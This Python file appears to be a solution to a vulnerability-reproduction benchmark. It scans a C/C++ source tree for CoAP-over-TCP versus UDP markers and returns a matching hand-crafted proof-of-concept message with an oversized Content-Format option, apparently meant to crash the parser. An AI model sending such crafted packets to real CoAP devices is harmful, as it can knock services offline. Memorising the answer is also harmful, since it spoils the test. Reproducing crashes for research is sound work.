import os
import re
import tarfile
from typing import Iterable, Optional


def _iter_source_texts_from_tar(tar_path: str) -> Iterable[str]:
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name.lower()
                if not (name.endswith((".c", ".cc", ".cpp", ".h", ".hpp"))):
                    continue
                if m.size <= 0:
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
                if not data:
                    continue
                yield data.decode("utf-8", "ignore")
    except Exception:
        return


def _iter_source_texts_from_dir(dir_path: str) -> Iterable[str]:
    for root, _, files in os.walk(dir_path):
        for fn in files:
            lfn = fn.lower()
            if not lfn.endswith((".c", ".cc", ".cpp", ".h", ".hpp")):
                continue
            p = os.path.join(root, fn)
            try:
                with open(p, "rb") as f:
                    data = f.read()
                if data:
                    yield data.decode("utf-8", "ignore")
            except Exception:
                continue


def _looks_like_coap_over_tcp(src_path: str) -> bool:
    texts = []
    if os.path.isdir(src_path):
        it = _iter_source_texts_from_dir(src_path)
    else:
        it = _iter_source_texts_from_tar(src_path)

    limit = 64
    for t in it:
        if not t:
            continue
        texts.append(t)
        limit -= 1
        if limit <= 0:
            break

    if not texts:
        return False

    joined = "\n".join(texts)
    low = joined.lower()

    tcp_markers = (
        "rfc8323",
        "coap over tcp",
        "coap-over-tcp",
        "coap_tcp",
        "coap tcp",
        "length nibble",
        "lengthnibble",
        "klenmask",
        "lengthmask",
        "coap::tcp",
    )
    udp_markers = (
        "messageid",
        "message id",
        "kcoapversion",
        "kversion1",
        "ktypeconfirmable",
        "confirmable",
        "non-confirmable",
        "nonconfirmable",
        "acknowledgement",
        "reset",
    )

    tcp_score = sum(1 for m in tcp_markers if m in low)
    udp_score = sum(1 for m in udp_markers if m in low)

    # If clearly TCP-specific without typical UDP header usage, treat as TCP.
    if tcp_score > udp_score and tcp_score >= 1:
        return True
    return False


def _build_coap_udp_poc() -> bytes:
    # CoAP over UDP:
    # Header: 0x48 (Ver=1, Type=CON, TKL=8), Code=0x01 (GET), Message ID=0x1234
    # Token: 8 bytes
    # Option: delta=12 (Content-Format), len=8 -> 0xC8, value=0x0100000000000000
    return bytes(
        [
            0x48,
            0x01,
            0x12,
            0x34,
            0x00,
            0x01,
            0x02,
            0x03,
            0x04,
            0x05,
            0x06,
            0x07,
            0xC8,
            0x01,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
        ]
    )


def _build_coap_tcp_poc() -> bytes:
    # CoAP over TCP (RFC8323):
    # Total message length after extended length bytes = 18 bytes (code+token+options)
    # First byte: LenNibble=13, TKL=8 => 0xD8
    # Ext len byte: 18-13=5
    # Code: 0x01
    # Token: 8 bytes
    # Option: 0xC8 + 8 bytes value
    return bytes(
        [
            0xD8,
            0x05,
            0x01,
            0x00,
            0x01,
            0x02,
            0x03,
            0x04,
            0x05,
            0x06,
            0x07,
            0xC8,
            0x01,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
        ]
    )


class Solution:
    def solve(self, src_path: str) -> bytes:
        if _looks_like_coap_over_tcp(src_path):
            return _build_coap_tcp_poc()
        return _build_coap_udp_poc()